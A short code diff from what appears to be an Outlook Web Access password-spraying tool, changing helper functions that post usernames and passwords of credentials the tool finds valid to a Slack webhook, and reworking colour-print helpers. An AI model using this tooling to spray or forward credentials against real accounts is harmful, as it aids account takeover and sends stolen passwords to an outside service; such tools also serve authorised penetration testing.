@@ -60,23 +60,28 @@ def get_owa_domain(url, uri, useragent):
 def slacknotify(username, password):
     now = datetime.now()
     webhook_url = configvars["slack_webhook"]
-    message = {"text": '```[PASSWORD SPRAY]\nUser: ' + username + '\nPass: ' + password + '\nDate: ' + now.strftime("%d-%m-%Y") + '\nTime: ' + now.strftime("%H:%M:%S") + '```'}
+    message = {"text": '```[Valid Credentials Obtained!]\nUser: ' + username + '\nPass: ' + password + '\nDate: ' + now.strftime("%d-%m-%Y") + '\nTime: ' + now.strftime("%H:%M:%S") + '```'}
     response = requests.post(
         webhook_url, data=json.dumps(message),
         headers={'Content-Type': 'application/json'}
     )
 
 # Function for debug messages 
-def slackupdate(update_msg):
+def slacklog(slacklog_msg):
     now = datetime.now()
     webhook_url = configvars["slack_webhook"]
-    message = {"text": '```[DEBUG MESSAGE]\n' + update_msg + '\nDate: ' + now.strftime("%d-%m-%Y") + '\nTime: ' + now.strftime("%H:%M:%S") + '```'}
+    message = {"text": '```[Log Entry]\n' + slacklog_msg + '\nDate: ' + now.strftime("%d-%m-%Y") + '\nTime: ' + now.strftime("%H:%M:%S") + '```'}
     response = requests.post(
         webhook_url, data=json.dumps(message),
         headers={'Content-Type': 'application/json'}
     )
 
 # Colour Functions - ZephrFish
-def prRed(skk): print("\033[91m {}\033[00m" .format(skk))
-def prGreen(skk): print("\033[92m {}\033[00m" .format(skk))
-def prYellow(skk): print("\033[93m {}\033[00m" .format(skk))
+def prRed(skk): 
+    return "\033[91m {}\033[00m" .format(skk)
+
+def prGreen(skk): 
+    return "\033[92m {}\033[00m" .format(skk)
+
+def prYellow(skk): 
+    return "\033[93m {}\033[00m" .format(skk)
